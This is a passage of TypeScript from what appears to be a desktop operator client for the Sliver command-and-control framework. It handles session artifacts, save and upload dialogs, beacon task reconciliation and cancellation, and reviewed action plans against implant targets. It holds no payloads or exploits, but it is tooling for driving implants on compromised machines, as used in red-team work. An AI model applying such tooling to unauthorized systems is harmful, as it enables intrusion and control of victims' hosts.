      try { this.executionArtifacts.remove(artifact.scope, artifact.handle); } catch { /* expired or revoked */ }
    }
  }

  private sessionArtifactGateway(
    sender: WebContents,
    scope: SessionArtifactScope,
    assertCurrent: () => void,
    uploadSourcePath?: string,
  ): SessionWorkbenchArtifactGateway {
    const owner = requireOwnerWindow(sender);
    const nativeSaves = new WeakMap<object, { path: string; intent: SessionSaveIntent }>();
    const storedSaves = new WeakMap<object, { handle: string; path: string; intent: SessionSaveIntent }>();
    return {
      prepareNativeSave: async ({ suggestedBasename }) => {
        assertCurrent();
        if (owner.isDestroyed()) throw new Error("The application window is no longer available");
        let selection;
        try {
          selection = await dialog.showSaveDialog(owner, {
            title: "Save session artifact",
            defaultPath: safeArtifactFileName(suggestedBasename),
          });
        } catch {
          throw new SessionWorkbenchBoundaryError("Could not open the native save dialog");
        }
        assertCurrent();
        if (selection.canceled || !selection.filePath) return null;
        const capability = Object.freeze({});
        const intent = await this.reserveSessionSaveIntent(selection.filePath);
        try {
          assertCurrent();
        } catch (error) {
          if (this.sessionSaveIntents.get(intent.destinationKey)?.token === intent.token) {
            this.sessionSaveIntents.delete(intent.destinationKey);
          }
          throw error;
        }
        nativeSaves.set(capability, {
          path: selection.filePath,
          intent,
        });
        return Object.freeze({ capability });
      },
      writeNativeSave: async (prepared, artifact) => {
        assertCurrent();
        const save = nativeSaves.get(prepared.capability);
        nativeSaves.delete(prepared.capability);
        if (!save) throw new Error("The native save capability is stale or already used");
        try {
          await this.commitSessionSaveIntent(save.intent, artifact.data, assertCurrent);
        } catch (error) {
          if (error instanceof SessionWorkbenchBoundaryError) throw error;
          throw new SessionWorkbenchBoundaryError("Could not save the session artifact");
        }
      },
      prepareUploadOpen: async ({ maximumBytes }) => {
        assertCurrent();
        let filePath = uploadSourcePath;
        if (filePath === undefined) {
          let selection;
          try {
            selection = await dialog.showOpenDialog(owner, {
              title: "Choose a file to upload",
              properties: ["openFile"],
            });
          } catch {
            throw new SessionWorkbenchBoundaryError("Could not open the native upload picker");
          }
          assertCurrent();
          filePath = selection.filePaths[0];
          if (selection.canceled || !filePath) return null;
        }
        assertCurrent();
        let selected;
        try {
          selected = await readBoundedRegularFile(filePath, {
            label: "Upload source",
            maxBytes: maximumBytes,
          });
        } catch {
          throw new SessionWorkbenchBoundaryError("Could not read the selected upload file");
        }
        try {
          assertCurrent();
          return {
            data: selected.data,
            suggestedBasename: safeArtifactFileName(basename(filePath)),
          };
        } catch (error) {
          selected.data.fill(0);
          throw error;
        }
      },
      captureScreenshot: (artifact) => {
        assertCurrent();
        const metadata = this.sessionArtifacts.store({
          scope,
          data: artifact.data,
          mediaType: artifact.mediaType,
          suggestedBasename: artifact.suggestedBasename,
          ownership: "take",
        });
        try {
          if (metadata.sha256 !== artifact.sha256) {
            throw new Error("Screenshot artifact digest changed before storage");
          }
          const preview = this.sessionArtifacts.previewDataUrl(scope, metadata.handle);
          return {
            status: "captured",
            artifact: {
              handle: metadata.handle,
              suggestedBasename: metadata.suggestedBasename,
              mediaType: metadata.mediaType,
              size: metadata.size,
              sha256: metadata.sha256,
              createdAt: metadata.createdAt,
              expiresAt: metadata.expiresAt,
            },
            preview: {
              mediaType: artifact.mediaType,
              dataUrl: preview,
              size: metadata.size,
            },
          };
        } catch (error) {
          this.sessionArtifacts.remove(scope, metadata.handle);
          throw error;
        }
      },
      stageEditorArtifact: (artifact) => {
        assertCurrent();
        if (!Buffer.isBuffer(artifact.data) || artifact.data.length > SESSION_EDITOR_MAX_BYTES) {
          throw new SessionWorkbenchBoundaryError("Editor content exceeds the session workbench limit");
        }
        if (artifact.mediaType !== "text/plain" && artifact.mediaType !== "application/octet-stream") {
          throw new SessionWorkbenchBoundaryError("Editor content has an unsupported media type");
        }
        const sha256 = createHash("sha256").update(artifact.data).digest("hex");
        if (sha256 !== artifact.sha256) {
          throw new SessionWorkbenchBoundaryError("Editor artifact digest changed before storage");
        }
        const metadata = this.sessionArtifacts.store({
          scope,
          data: artifact.data,
          mediaType: artifact.mediaType,
          suggestedBasename: safeArtifactFileName(artifact.suggestedBasename),
          ttlMilliseconds: SESSION_ACTION_PLAN_TTL_MS,
          ownership: "clone",
        });
        try {
          if (
            metadata.size !== artifact.data.length ||
            metadata.sha256 !== sha256 ||
            metadata.mediaType !== artifact.mediaType
          ) {
            throw new Error("Editor artifact metadata changed before storage");
          }
          return metadata;
        } catch (error) {
          this.sessionArtifacts.remove(scope, metadata.handle);
          throw error;
        }
      },
      prepareStoredArtifactSave: async (handle) => {
        assertCurrent();
        const metadata = this.sessionArtifacts.metadata(scope, handle);
        let selection;
        try {
          selection = await dialog.showSaveDialog(owner, {
            title: "Save session artifact",
            defaultPath: metadata.suggestedBasename,
          });
        } catch {
          throw new SessionWorkbenchBoundaryError("Could not open the native save dialog");
        }
        assertCurrent();
        if (selection.canceled || !selection.filePath) return null;
        const capability = Object.freeze({});
        const intent = await this.reserveSessionSaveIntent(selection.filePath);
        try {
          assertCurrent();
        } catch (error) {
          if (this.sessionSaveIntents.get(intent.destinationKey)?.token === intent.token) {
            this.sessionSaveIntents.delete(intent.destinationKey);
          }
          throw error;
        }
        storedSaves.set(capability, {
          handle,
          path: selection.filePath,
          intent,
        });
        return Object.freeze({
          capability,
          suggestedBasename: metadata.suggestedBasename,
          size: metadata.size,
          sha256: metadata.sha256,
        });
      },
      writeStoredArtifact: async (prepared: SessionPreparedStoredArtifactSave) => {
        assertCurrent();
        const save = storedSaves.get(prepared.capability);
        storedSaves.delete(prepared.capability);
        if (!save) throw new Error("The stored artifact save capability is stale or already used");
        const consumed = this.sessionArtifacts.consume(scope, save.handle);
        try {
          try {
            await this.commitSessionSaveIntent(save.intent, consumed.data, assertCurrent);
          } catch (error) {
            if (error instanceof SessionWorkbenchBoundaryError) throw error;
            throw new SessionWorkbenchBoundaryError("Could not save the session artifact");
          }
        } finally {
          consumed.data.fill(0);
        }
      },
    };
  }

  private async reserveSessionSaveIntent(path: string): Promise<SessionSaveIntent> {
    const previousReservation = this.sessionSaveReservationTail;
    let releaseReservation!: () => void;
    const reservationGate = new Promise<void>((resolveReservation) => { releaseReservation = resolveReservation; });
    const reservationTail = previousReservation.catch(() => undefined).then(() => reservationGate);
    this.sessionSaveReservationTail = reservationTail;
    await previousReservation.catch(() => undefined);
    try {
      let destinationPath: string;
      try {
        const canonicalDirectory = await realpath(dirname(path));
        const candidate = join(canonicalDirectory, basename(path));
        try {
          const existing = await lstat(candidate);
          if (existing.isSymbolicLink() || !existing.isFile()) {
            throw new SessionWorkbenchBoundaryError("The selected artifact destination is not a regular file");
          }
          destinationPath = await realpath(candidate);
        } catch (error) {
          if ((error as NodeJS.ErrnoException).code !== "ENOENT") throw error;
          destinationPath = candidate;
        }
      } catch (error) {
        if (error instanceof SessionWorkbenchBoundaryError) throw error;
        throw new SessionWorkbenchBoundaryError("Could not prepare the selected artifact destination");
      }
      const now = this.now();
      for (const [key, intent] of this.sessionSaveIntents) {
        if (intent.reservedAt + SESSION_SAVE_INTENT_TTL_MS <= now) this.sessionSaveIntents.delete(key);
      }
      while (this.sessionSaveIntents.size >= MAX_SESSION_SAVE_INTENTS) {
        const oldest = [...this.sessionSaveIntents.values()].sort((left, right) => left.reservedAt - right.reservedAt)[0];
        if (!oldest) break;
        this.sessionSaveIntents.delete(oldest.destinationKey);
      }
      const normalizedDestination = destinationPath.normalize("NFC");
      const destinationKey = process.platform === "win32" || process.platform === "darwin"
        ? normalizedDestination.toLowerCase()
        : normalizedDestination;
      const intent: SessionSaveIntent = {
        destinationKey,
        destinationPath,
        token: randomUUID(),
        reservedAt: now,
      };
      this.sessionSaveIntents.set(destinationKey, intent);
      return intent;
    } finally {
      releaseReservation();
      if (this.sessionSaveReservationTail === reservationTail) {
        this.sessionSaveReservationTail = Promise.resolve();
      }
    }
  }

  private async commitSessionSaveIntent(
    intent: SessionSaveIntent,
    data: Buffer,
    assertCurrent: () => void,
  ): Promise<void> {
    const previous = this.sessionSaveLocks.get(intent.destinationKey) ?? Promise.resolve();
    let release!: () => void;
    const gate = new Promise<void>((resolveGate) => { release = resolveGate; });
    const tail = previous.catch(() => undefined).then(() => gate);
    this.sessionSaveLocks.set(intent.destinationKey, tail);
    await previous.catch(() => undefined);
    try {
      await writePrivateArtifactFileAtomic(intent.destinationPath, data, () => {
        assertCurrent();
        if (this.sessionSaveIntents.get(intent.destinationKey)?.token !== intent.token) {
          throw new SessionWorkbenchBoundaryError(
            "A newer save to this destination superseded the stale artifact response",
          );
        }
      });
    } finally {
      release();
      if (this.sessionSaveLocks.get(intent.destinationKey) === tail) {
        this.sessionSaveLocks.delete(intent.destinationKey);
      }
    }
  }

  private async chooseSessionUploadArtifact(
    contentsId: number,
    scope: SessionArtifactScope,
  ): Promise<{
    handle: string;
    suggestedBasename: string;
    size: number;
    sha256: string;
    expiresAt: number;
  } | null> {
    const sender = webContents.fromId(contentsId);
    if (!sender || sender.isDestroyed()) throw new Error("The application window is no longer available");
    const owner = requireOwnerWindow(sender);
    let selection;
    try {
      selection = await dialog.showOpenDialog(owner, {
        title: "Choose a file to upload",
        properties: ["openFile"],
      });
    } catch {
      throw new SessionWorkbenchBoundaryError("Could not open the native upload picker");
    }
    const filePath = selection.filePaths[0];
    if (selection.canceled || !filePath) return null;
    let selected;
    try {
      selected = await readBoundedRegularFile(filePath, {
        label: "Upload source",
        maxBytes: SESSION_WORKBENCH_MAX_ARTIFACT_BYTES,
      });
    } catch {
      throw new SessionWorkbenchBoundaryError("Could not read the selected upload file");
    }
    const sha256 = createHash("sha256").update(selected.data).digest("hex");
    const suggestedBasename = safeArtifactFileName(basename(filePath));
    const metadata = this.sessionArtifacts.store({
      scope,
      data: selected.data,
      mediaType: "application/octet-stream",
      suggestedBasename,
      ttlMilliseconds: SESSION_ACTION_PLAN_TTL_MS,
      ownership: "take",
    });
    return {
      handle: metadata.handle,
      suggestedBasename,
      size: metadata.size,
      sha256,
      expiresAt: Date.parse(metadata.expiresAt),
    };
  }

  private pruneSessionPlans(context: WindowContext): void {
    const now = this.now();
    for (const [token, plan] of context.sessionPlans) {
      if (plan.expiresAt > now) continue;
      context.sessionPlans.delete(token);
      const timer = context.sessionPlanTimers.get(token);
      if (timer) clearTimeout(timer);
      context.sessionPlanTimers.delete(token);
      if (plan.artifactHandle && plan.artifactScope) {
        try {
          this.sessionArtifacts.remove(plan.artifactScope, plan.artifactHandle);
        } catch {
          // A newer session binding may already have revoked this capability.
        }
      }
    }
  }

  private requireOperationEngine(
    contentsId: number,
    context: WindowContext,
    pool: BackendPool,
  ): OperationEngine {
    if (context.operationEngine && context.operationPoolKey === pool.key) return context.operationEngine;
    closeWindowOperationEngine(context);
    const connectionAttempt = context.connectionAttempt;
    let engine: OperationEngine | undefined;
    const assertOperationBinding = (): void => {
      if (
        this.windows.get(contentsId) !== context ||
        context.poolKey !== pool.key ||
        context.operationPoolKey !== pool.key ||
        context.connectionAttempt !== connectionAttempt ||
        context.operationEngine !== engine ||
        this.pools.get(pool.key) !== pool
      ) {
        throw new Error("The backend connection changed; the operation no longer belongs to this window");
      }
    };
    const resolveTargetReference = (target: TargetRef): ResolvedOperationTarget | null => {
      assertOperationBinding();
      assertTargetDomainAuthoritative(pool, target.mode);
      const current = pool.targetStore.revalidateTargetRef(target, pool.epoch);
      if (!current) return null;
      const authoritativeActiveC2 = pool.targetStore.authoritativeActiveC2(target.mode, target.id);
      return {
        ref: current.ref,
        summary: current.target,
        backend: operationBackendSummary(context, pool),
        ...(authoritativeActiveC2
          ? { authoritativeActiveC2 }
          : {}),
      };
    };
    const resolveTarget = (requireActiveIdentity?: TargetRef): ResolvedOperationTarget | null => {
      assertOperationBinding();
      const active = context.activeTarget;
      if (!active) return null;
      if (requireActiveIdentity && !sameTargetRefIdentity(active, requireActiveIdentity)) {
        throw new Error("The selected target changed before the operation was dispatched");
      }
      return resolveTargetReference(requireActiveIdentity ?? active);
    };
    context.operationPoolKey = pool.key;
    engine = new OperationEngine({
      client: pool.client,
      ownerWindowId: contentsId,
      resolveActiveTarget: () => resolveTarget(),
      assertTarget: (target) => {
        const resolved = resolveTarget(target);
        if (!resolved) throw new Error("The selected target is no longer available");
        return resolved;
      },
      resolveJournaledTarget: (target) => {
        const resolved = resolveTargetReference(target);
        if (!resolved) throw new Error("The operation target is no longer available");
        return resolved;
      },
      reserveTaskClaim: (requestId) => pool.reserveTaskClaim(contentsId, requestId),
      releaseTaskClaimReservation: (requestId) =>
        pool.releaseTaskClaimReservation(contentsId, requestId),
      claimTask: (taskId, requestId, operationId, beaconId, expectedPingNonce, expectedRequest) =>
        pool.claimTask(
          contentsId,
          taskId,
          requestId,
          operationId,
          beaconId,
          expectedPingNonce,
          true,
          expectedRequest,
        ),
      claimExternalTask: (taskId, requestId, operationId, beaconId) =>
        pool.claimTask(
          contentsId,
          taskId,
          requestId,
          operationId,
          beaconId,
          undefined,
          false,
        ),
      settleTaskClaim: (taskId, requestId) => pool.settleTaskClaim(contentsId, taskId, requestId),
      capability: (target, capabilityId) => {
        assertOperationBinding();
        return targetCapability(
          calculatePoolTargetCapabilities(pool, target.summary),
          capabilityId,
        );
      },
      refreshTargets: async () => {
        assertOperationBinding();
        await pool.refreshDomains(["sessions", "beacons"]);
        assertOperationBinding();
      },
      cancelTask: async (target, taskId) => {
        let dispatchStarted = false;
        try {
          assertOperationBinding();
          if (target.mode !== "beacon" || !pool.targetStore.revalidateTargetRef(target, pool.epoch)) {
            throw new Error("The beacon is no longer available for task cancellation");
          }
          await pool.beaconTasks.refresh(
            target.id,
            [taskId, ...localTaskIdsForBeacon(context, target.id)],
            pool.recoverableTaskIdsForBeacon(target.id),
          );
          assertOperationBinding();
          const resolveOwnership = this.taskOwnershipResolver(context);
          const beforeDispatch = pool.beaconTasks.task(target.id, taskId, resolveOwnership);
          if (beforeDispatch.state !== "pending") {
            await this.reconcileOperationFromTask(
              engine!,
              await this.verifiedTaskForReconciliation(pool, beforeDispatch, resolveOwnership),
            );
            this.pushBeaconTasksInvalidated(contentsId, target);
            return;
          }
          try {
            const canceled = await pool.beaconTasks.cancel(target.id, taskId, resolveOwnership);
            dispatchStarted = true;
            await engine!.reconcileTask({ taskId, beaconId: target.id, state: canceled.state });
            try {
              assertOperationBinding();
              this.pushBeaconTasksInvalidated(contentsId, target);
            } catch {
              // Preserve the exact old-backend result without notifying a replacement context.
            }
            return;
          } catch (error) {
            if (error instanceof BeaconTaskCancellationError) {
              dispatchStarted = error.dispatchStarted;
              if (!dispatchStarted) throw error;
            } else if (!dispatchStarted) {
              throw error;
            }
            // A response can be lost after the server commits cancellation.
            // Reconcile once from pinned state and never replay the request.
          }
          await pool.beaconTasks.refresh(
            target.id,
            [taskId, ...localTaskIdsForBeacon(context, target.id)],
            pool.recoverableTaskIdsForBeacon(target.id),
          );
          assertOperationBinding();
          const refreshed = pool.beaconTasks.task(target.id, taskId, resolveOwnership);
          if (refreshed.state === "pending") {
            throw new TaskCancellationDispatchError(
              "The task cancellation outcome could not be confirmed",
              true,
            );
          }
          await this.reconcileOperationFromTask(
            engine!,
            await this.verifiedTaskForReconciliation(pool, refreshed, resolveOwnership),
          );
          this.pushBeaconTasksInvalidated(contentsId, target);
        } catch (error) {
          if (error instanceof TaskCancellationDispatchError) throw error;
          const cancellationDispatchStarted = error instanceof BeaconTaskCancellationError
            ? error.dispatchStarted
            : dispatchStarted;
          throw new TaskCancellationDispatchError(
            error instanceof BeaconTaskCancellationError
              ? error.message
              : cancellationDispatchStarted
              ? "The task cancellation outcome could not be confirmed"
              : "The task could not be revalidated before cancellation",
            cancellationDispatchStarted,
          );
        }
      },
      onChanged: (record) => {
        if (
          this.windows.get(contentsId) !== context ||
          context.operationEngine !== engine ||
          context.operationPoolKey !== pool.key ||
          context.poolKey !== pool.key ||
          this.pools.get(pool.key) !== pool
        ) return;
        this.pushOperationChanged(contentsId, record);
        if (requiresActiveTaskPolling(record)) {
          this.ensureOperationReconciliation(contentsId);
        } else if (TERMINAL_OPERATION_STATES.has(record.state)) {
          this.stopOperationReconciliationIfIdle(context);
        }
      },
      now: this.now,
    });
    context.operationEngine = engine;
    return engine;
  }

  private requireSelectedBeacon(
    contentsId: number,
    pool: BackendPool,
  ): { context: WindowContext; target: RevalidatedTarget } {
    const context = this.requireWindow(contentsId);
    if (!context.activeTarget || context.activeTarget.mode !== "beacon") {
      throw new Error("Select an available beacon before viewing tasks");
    }
    assertTargetDomainAuthoritative(pool, "beacon");
    const target = pool.targetStore.revalidateTargetRef(context.activeTarget, pool.epoch);
    if (!target || target.target.mode !== "beacon") throw new Error("The selected beacon is no longer available");
    const capability = targetCapability(
      calculatePoolTargetCapabilities(pool, target.target),
      "beacon.tasks.read",
    );
    if (!capability.available) throw new Error(capability.reason?.message ?? "Beacon tasks are unavailable");
    return { context, target };
  }

  private taskOwnershipResolver(context: WindowContext): TaskOwnershipResolver {
    const engine = context.operationEngine;
    const pool = context.poolKey ? this.pools.get(context.poolKey) : undefined;
    const ownerWindowId = context.contentsId;
    return (taskId, beaconId) => {
      const selected = context.activeTarget;
      const fact = pool && selected?.mode === "beacon" && selected.id === beaconId
        ? pool.executionTaskFact(taskId, selected) : undefined;
      const foundOperation = engine?.findByTask(taskId, beaconId);
      const operation = foundOperation && selected && sameTargetRefIdentity(foundOperation.target, selected) ? foundOperation : undefined;
      if (operation) {
        const requiresResultVerification =
          engine?.requiresTaskResultVerification(taskId, beaconId) === true;
        const expectedPingNonce = engine?.expectedPingNonceForTask(taskId, beaconId);
        const expectedRequest = engine?.expectedRequestForTask(taskId, beaconId);
        return {
          ownership: operation.ownership,
          localRequestId: operation.requestId,
          ...(isExecutionOperationId(operation.operationId)
            ? fact?.operationId === operation.operationId
              ? { executionOperationId: fact.operationId, processWaited: fact.processWaited }
              : {}
            : requiresResultVerification
            ? {
                operationId: operation.operationId as TargetOperationId,
                ...(expectedPingNonce === undefined ? {} : { expectedPingNonce }),
                ...(expectedRequest === undefined ? {} : { expectedRequest }),
              }
            : {}),
        };
      }
      const claim = pool?.taskClaimForWindow(taskId, beaconId, ownerWindowId);
      if (claim && (!isExecutionOperationId(claim.operationId) || fact?.operationId === claim.operationId)) {
        return {
          ownership: {
            origin: "local",
            ownerWindowId,
            actor: { attribution: "unknown" },
          },
          localRequestId: claim.requestId,
          ...(isExecutionOperationId(claim.operationId)
            ? { executionOperationId: fact!.operationId, processWaited: fact!.processWaited }
            : claim.requiresResultVerification
            ? {
                operationId: claim.operationId as TargetOperationId,
                ...(claim.expectedPingNonce === undefined
                  ? {}
                  : { expectedPingNonce: claim.expectedPingNonce }),
                ...(claim.expectedRequest === undefined ? {} : { expectedRequest: claim.expectedRequest }),
              }
            : {}),
        };
      }
      if (fact) {
        return {
          ownership: { origin: "unknown", actor: { attribution: "unknown" } },
          executionOperationId: fact.operationId,
          processWaited: fact.processWaited,
        };
      }
      return { ownership: { origin: "unknown", actor: { attribution: "unknown" } } };
    };
  }

  private async reconcileOperationFromTask(
    engine: OperationEngine,
    task: BeaconTaskSummary | BeaconTaskDetail,
  ): Promise<void> {
    if (!engine.findByTask(task.taskId, task.beaconId)) return;
    if (
      task.state === "completed" &&
      !engine.requiresTaskResultVerification(task.taskId, task.beaconId)
    ) {
      // Completed M4 external tasks require their operation-specific response
      // decoder. The generic task detail path can neither prove success nor
      // safely translate a task-level result for the reviewed operation.
      return;
    }
    const taskError = "error" in task ? task.error : undefined;
    const errorKind = "errorKind" in task ? task.errorKind : undefined;
    if (errorKind === "decode-uncertain") {
      engine.markTaskOutcomeUnknown(
        task.taskId,
        task.beaconId,
        "The beacon task completed, but its response could not be verified",
      );
      return;
    }
    await engine.reconcileTask({
      taskId: task.taskId,
      beaconId: task.beaconId,
      state: task.state === "completed" && errorKind === "target-reported" ? "failed" : task.state,
      ...(task.state === "completed" && "disposition" in task && task.disposition
        ? { disposition: task.disposition }
        : {}),
      ...(taskError ? { error: taskError } : {}),
    });
  }

  private async verifiedTaskForReconciliation(
    pool: BackendPool,
    task: BeaconTaskSummary,
    resolveOwnership: TaskOwnershipResolver,
  ): Promise<BeaconTaskSummary | BeaconTaskDetail> {
    return task.state === "completed"
      ? pool.beaconTasks.detail(task.beaconId, task.taskId, resolveOwnership)
      : task;
  }

  private ensureOperationReconciliation(contentsId: number): void {
    const context = this.windows.get(contentsId);
    if (!context?.operationEngine || context.operationReconcileTimer) return;
    context.operationReconcileTimer = setInterval(() => {
      void this.reconcileWindowOperations(contentsId, "explicit-refresh");
    }, OPERATION_RECONCILE_INTERVAL_MS);
    context.operationReconcileTimer.unref();
    void this.reconcileWindowOperations(contentsId, "operation-submitted");
  }

  private async reconcileWindowOperations(
    contentsId: number,
    reason: BeaconTasksInvalidationReason,
    includeOutcomeUnknown = false,
  ): Promise<void> {
    const context = this.windows.get(contentsId);
    if (!context?.operationEngine || !context.poolKey) return;
    if (context.operationReconcileInFlight) {
      if (includeOutcomeUnknown || reason === "server-event" || reason === "reconnect") {
        context.operationReconcilePending = true;
        context.operationReconcileIncludeOutcomeUnknown =
          context.operationReconcileIncludeOutcomeUnknown === true || includeOutcomeUnknown;
        context.operationReconcilePendingReason = mergeReconcileReason(
          context.operationReconcilePendingReason,
          reason,
        );
      }
      return context.operationReconcileInFlight;
    }
    const pool = this.pools.get(context.poolKey);
    if (!pool || context.operationPoolKey !== pool.key) return;
    const engine = context.operationEngine;
    const bindingCurrent = (): boolean =>
      this.windows.get(contentsId) === context &&
      context.operationEngine === engine &&
      context.operationPoolKey === pool.key &&
      context.poolKey === pool.key &&
      this.pools.get(pool.key) === pool;
    const reconcileOnce = async (
      currentReason: BeaconTasksInvalidationReason,
      currentIncludeOutcomeUnknown: boolean,
    ): Promise<void> => {
      if (!bindingCurrent()) return;
      engine.expireOverdueTasks();
      const recoverUncertain =
        currentIncludeOutcomeUnknown || currentReason === "server-event" || currentReason === "reconnect";
      const pending = allWindowOperations(engine).filter(
        recoverUncertain
          ? requiresTaskReconciliation
          : requiresActiveTaskPolling,
      );
      const beaconIds = [...new Set([
        ...pending.map((operation) => operation.target.id),
        ...(recoverUncertain && context.activeTarget?.mode === "beacon"
          ? [context.activeTarget.id]
          : []),
      ])];
      for (const beaconId of beaconIds) {
        if (!bindingCurrent()) return;
        try {
          await pool.beaconTasks.refresh(
            beaconId,
            pending.flatMap((operation) => operation.target.id === beaconId && operation.taskId ? [operation.taskId] : []),
            pool.recoverableTaskIdsForBeacon(beaconId),
          );
        } catch {
          continue;
        }
        if (!bindingCurrent()) return;
        for (const operation of pending.filter((candidate) => candidate.target.id === beaconId)) {
          if (!operation.taskId) continue;
          let summary: BeaconTaskSummary;
          try {
            summary = pool.beaconTasks.task(beaconId, operation.taskId, this.taskOwnershipResolver(context));
          } catch {
            continue;
          }
          const requiresTypedM1Result = engine.requiresTaskResultVerification(
            operation.taskId,
            beaconId,
          );
          if (summary.state === "completed" && requiresTypedM1Result) {
            try {
              const detail = await pool.beaconTasks.detail(
                beaconId,
                operation.taskId,
                this.taskOwnershipResolver(context),
              );
              if (!bindingCurrent()) return;
              await this.reconcileOperationFromTask(engine, detail);
            } catch {
              if (!bindingCurrent()) return;
              engine.markTaskOutcomeUnknown(
                operation.taskId,
                operation.target.id,
                "The beacon task completed, but its response could not be fetched and verified",
              );
            }
          } else if (summary.state !== "completed") {
            if (!bindingCurrent()) return;
            await this.reconcileOperationFromTask(engine, summary);
          }
          // A completed external M4 task remains non-terminal until its exact
          // operation-specific protobuf response is fetched and decoded by the
          // execution result/read refresh path. Server state alone cannot prove
          // that the implant accepted the request.
        }
        if (!bindingCurrent()) return;
        const ref = pool.targetStore.createTargetRef("beacon", beaconId, pool.epoch);
        if (ref) this.pushBeaconTasksInvalidated(contentsId, ref);
      }
      this.stopOperationReconciliationIfIdle(context);
    };
    const run = (async () => {
      let currentReason = reason;
      let currentIncludeOutcomeUnknown = includeOutcomeUnknown;
      while (bindingCurrent()) {
        context.operationReconcilePending = false;
        context.operationReconcileIncludeOutcomeUnknown = false;
        delete context.operationReconcilePendingReason;
        await reconcileOnce(currentReason, currentIncludeOutcomeUnknown);
        if (!context.operationReconcilePending || !bindingCurrent()) break;
        currentReason = context.operationReconcilePendingReason ?? "server-event";
        currentIncludeOutcomeUnknown = reconcileIncludesOutcomeUnknown(context);
      }
    })().finally(async () => {
      if (context.operationReconcileInFlight === run) {
        const runFollowup = context.operationReconcilePending === true && bindingCurrent();
        const followupReason = context.operationReconcilePendingReason ?? "server-event";
        const followupIncludeOutcomeUnknown = reconcileIncludesOutcomeUnknown(context);
        delete context.operationReconcileInFlight;
        context.operationReconcilePending = false;
        context.operationReconcileIncludeOutcomeUnknown = false;
        delete context.operationReconcilePendingReason;
        if (runFollowup) {
          await this.reconcileWindowOperations(
            contentsId,
            followupReason,
            followupIncludeOutcomeUnknown,
          );
        }
      }
    });
    context.operationReconcileInFlight = run;
    return run;
  }

  private reconcilePoolOperations(poolKey: string, reason: PoolTaskSignalReason): void {
    for (const [contentsId, context] of this.windows) {
      if (context.poolKey === poolKey && context.operationEngine) {
        if (reason === "connection-interrupted") {
          for (const operation of allWindowOperations(context.operationEngine)) {
            if (requiresTaskReconciliation(operation) && operation.state !== "outcome-unknown") {
              context.operationEngine.markTaskOutcomeUnknown(
                operation.taskId!,
                operation.target.id,
                "The operator connection was interrupted after task submission; awaiting authoritative reconciliation",
              );
            }
          }
        } else {
          void this.reconcileWindowOperations(contentsId, reason);
        }
      }
    }
  }

  private stopOperationReconciliationIfIdle(context: WindowContext): void {
    const engine = context.operationEngine;
    if (!engine || allWindowOperations(engine).some((operation) =>
      requiresActiveTaskPolling(operation)
    )) return;
    if (context.operationReconcileTimer) clearInterval(context.operationReconcileTimer);
    delete context.operationReconcileTimer;
  }

  private pushOperationChanged(contentsId: number, operation: Readonly<TargetOperationRecord>): void {
    const contents = webContents.fromId(contentsId);
    if (contents && !contents.isDestroyed()) contents.send(IPC.operationChanged, structuredClone(operation));
  }

  private pushBeaconTasksInvalidated(contentsId: number, target: TargetRef): void {
    const contents = webContents.fromId(contentsId);
    if (contents && !contents.isDestroyed()) contents.send(IPC.beaconTasksInvalidated, { ...target });
  }

  async prepareTargetAction(
    contentsId: number,
    input: PrepareTargetActionInput,
  ): Promise<OperationResult<TargetActionPlan>> {
    let context: WindowContext;
    try {
      context = this.requireWindow(contentsId);
      this.pruneTargetPlans(context);
      if (context.targetPlans.size + context.targetPlanAdmissions.size >= MAX_OUTSTANDING_TARGET_ACTION_PLANS) {
        throw new Error("Too many target action plans are awaiting review; use or let an existing plan expire");
      }
    } catch (error) {
      return { ok: false, error: errorMessage(error) };
    }
    const admissionId = randomUUID();
    context.targetPlanAdmissions.add(admissionId);
    try {
      return await this.withPool(contentsId, async (pool, assertBinding) => {
      const context = this.requireWindow(contentsId);
      const domains = targetActionDomains(input.actionId, context);
      await pool.refreshDomains(domains);
      assertBinding();
      const candidates = this.targetActionCandidates(context, pool, input.actionId);
      const targets = candidates.targets;
      if (targets.length === 0) throw new Error("No targets currently match this action");
      const token = randomUUID();
      const expiresAt = this.now() + TARGET_ACTION_PLAN_TTL_MS;
      const internal: InternalTargetActionPlan = {
        token,
        expiresAt,
        contentsId,
        poolKey: pool.key,
        epoch: pool.epoch,
        actionId: input.actionId,
        targets,
        totalTargets: candidates.totalTargets,
      };
      this.pruneTargetPlans(context);
      context.targetPlans.set(token, internal);
      return {
        token,
        expiresAt: new Date(expiresAt).toISOString(),
        impact: {
          actionId: input.actionId,
          backend: targetBackendSummary(context, pool),
          targets: targets.map(({ summary }) => ({ ...summary })),
          totalTargets: candidates.totalTargets,
          truncated: candidates.totalTargets > targets.length,
          warning: candidates.totalTargets > targets.length
            ? `${targetActionWarning(input.actionId)} This one-use plan reviews ${targets.length} of ${candidates.totalTargets} matching targets; prepare another plan for the remaining targets.`
            : targetActionWarning(input.actionId),
        },
      };
      });
    } finally {
      context.targetPlanAdmissions.delete(admissionId);
    }
  }

  async executeTargetActionPlan(
    contentsId: number,
    token: string,
  ): Promise<OperationResult<TargetActionExecutionResult>> {
    try {
      const context = this.requireWindow(contentsId);
      const poolKey = context.poolKey;
      const pool = poolKey ? this.pools.get(poolKey) : undefined;
      const usableStatuses = new Set(["connected", "degraded", "reconnecting"]);
      if (!pool || !usableStatuses.has(pool.snapshot.connection.status)) {
        throw new Error("Connect to a Sliver server first");
      }
      const epoch = pool.epoch;
      const attempt = context.connectionAttempt;
      const bindingCurrent = (): boolean =>
        this.windows.get(contentsId) === context &&
        context.poolKey === poolKey &&
        context.connectionAttempt === attempt &&
        this.pools.get(poolKey!) === pool &&
        pool.epoch === epoch;
      const poolCurrent = (): boolean => this.pools.get(pool.key) === pool && pool.epoch === epoch;
      if (!bindingCurrent()) throw new Error("The backend connection changed; review a new action plan");

      this.pruneTargetPlans(context);
      const plan = context.targetPlans.get(token);
      context.targetPlans.delete(token);
      if (!plan) throw new Error("The target action plan expired or was already used");
      if (
        plan.contentsId !== contentsId ||
        plan.poolKey !== pool.key ||
        plan.epoch !== pool.epoch ||
        plan.expiresAt <= this.now()
      ) {
        throw new Error("The target action plan is no longer valid for this backend");
      }

      const domains = targetActionDomains(plan.actionId, context);
      await pool.refreshDomains(domains);
      if (!bindingCurrent()) throw new Error("The backend connection changed; review a new action plan");
      const current = this.targetActionCandidates(context, pool, plan.actionId);
      if (
        plan.totalTargets !== current.totalTargets ||
        !sameTargetPlanResources(plan.targets, current.targets)
      ) {
        throw new Error("The reviewed target set changed; prepare and review a new action plan");
      }

      const outcomes: TargetActionExecutionResult["outcomes"] = [];
      for (const [index, target] of plan.targets.entries()) {
        if (!bindingCurrent()) {
          for (const remaining of plan.targets.slice(index)) {
            outcomes.push({
